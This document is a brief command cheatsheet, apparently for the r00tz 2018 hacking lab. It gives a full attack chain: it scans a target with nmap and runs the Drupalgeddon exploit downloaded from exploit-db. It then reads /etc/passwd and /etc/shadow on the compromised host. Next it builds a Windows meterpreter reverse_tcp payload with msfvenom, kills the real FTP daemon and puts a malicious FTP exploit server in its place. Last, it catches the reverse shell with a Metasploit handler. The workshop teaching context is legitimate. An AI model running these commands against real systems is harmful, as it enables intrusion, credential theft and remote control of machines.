# r00tz2018 Commands Cheatsheet

Ping a host
```bash
ping [target internal IP]
```

Nmap a host
```bash
nmap [target internal IP] -T5 -A -sS -p20-450,3389,5900-5902
```

Download and run Drupalgeddon exploit
```bash
cd ~
wget https://www.exploit-db.com/download/44449.rb
ruby 44449.rb http://[target internal address]
```

Recon on exploited host
```bash
whoami
cat /etc/passwd
cat /etc/shadow
ls -hal ~
pwd
ls -hal ./
```

Enumerate network services on exploited host
```bash
netstat -ltnup
```

Generate pivot RCE exploit
```bash
sudo ifconfig eth0
# use the inet IP for the LHOST parameter in the next command. Alternatively, just use the one below.
cd ~
msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=$(sudo ifconfig eth0 | awk '$0~/inet / {print $2}') LPORT=443 > rtcp_bytecode.txt
```

Setup for pivot exploits
```bash
cd ~

# copy over payload
scp ec2-user@[your internal ip]:~/rtcp_bytecode.txt ./

# download exploit server
wget https://www.exploit-db.com/raw/44596/ > ftpexploit.py

# copy rtcp_bytecode into the buf variable in ftpexploit.py

# find and kill real ftpd
ps aux | grep ftp 
ls -l /proc/[PID of ftpd]/exe
kill -15 [PID of ftpd]

# run exploit server
sudo python ftpexploit.py
```

Start Metasploit on attacker VM
```bash
sudo msfconsole
```

Commands for metasploit
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [your internal ip]
set lport 443
run
```
